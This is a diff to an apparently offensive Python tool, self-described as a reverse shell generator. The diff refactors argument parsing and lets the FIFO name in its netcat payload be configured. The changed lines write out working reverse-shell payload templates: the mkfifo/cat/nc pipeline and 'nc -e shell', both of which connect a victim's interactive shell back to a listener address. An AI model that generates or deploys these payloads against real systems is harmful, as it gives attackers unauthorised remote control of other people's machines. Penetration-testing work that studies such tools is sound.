@@ -11,10 +11,9 @@ import time
 import random
 import threading
 import paramiko
-import readline
 import base64
 import select
-import pwnlib
+import argparse
 
 
 try:
@@ -391,7 +390,8 @@ def generate_payload(payload_type, local_address, port, index=None, **kwargs):
     elif payload_type in ["netcat", "nc", "ncat"]:
         method = kwargs.get("method", "fifo")
         if method == "fifo":
-            payload = f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|{payload_type} {local_address} {port} >/tmp/f"    
+            fifo_name = kwargs.get("fifo_name", "f")
+            payload = f"rm /tmp/{fifo_name};mkfifo /tmp/{fifo_name};cat /tmp/{fifo_name}|{shell} -i 2>&1|{payload_type} {local_address} {port} >/tmp/{fifo_name}"    
         else:
             payload = f"{payload_type} {local_address} {port} -e {shell}"
     elif payload_type == "java":
@@ -498,14 +498,24 @@ def create_tunnel(shell, ports: list):
 
 if __name__ == "__main__":
 
-    if len(sys.argv) < 2:
-        print("Usage: %s <type> [port]" % sys.argv[0])
-        exit(1)
+    parser = argparse.ArgumentParser(description="Reverse shell generator")
+    parser.add_argument(dest="type", type=str, default=None, help="Payload type")
+    parser.add_argument("--port", type=int, required=False, default=None, help="Listening port")
+    parser.add_argument("--addr", type=str, required=False, default=util.get_address(), help="Listening address")
+    args, extra = parser.parse_known_args()
 
-    listen_port = None if len(sys.argv) < 3 else int(sys.argv[2])
-    payload_type = sys.argv[1].lower()
+    listen_port = args.port
+    payload_type = args.type.lower()
+    local_address = args.addr
+    extra_args = {}
 
-    local_address = util.get_address()
+    for entry in extra:
+        match = re.match(r"(\w+)=(\w+)", entry)
+        if not match:
+            print("Invalid extra argument:", entry)
+            exit()
+        key, value = match.groups()
+        extra_args[key] = value
 
     # choose random port
     if listen_port is None:
@@ -513,7 +523,7 @@ if __name__ == "__main__":
         while util.is_port_in_use(listen_port):
             listen_port = random.randint(10000,65535)
 
-    payload = generate_payload(payload_type, local_address, listen_port)
+    payload = generate_payload(payload_type, local_address, listen_port, **extra_args)
 
     if payload is None:
         print("Unknown payload type: %s" % payload_type)
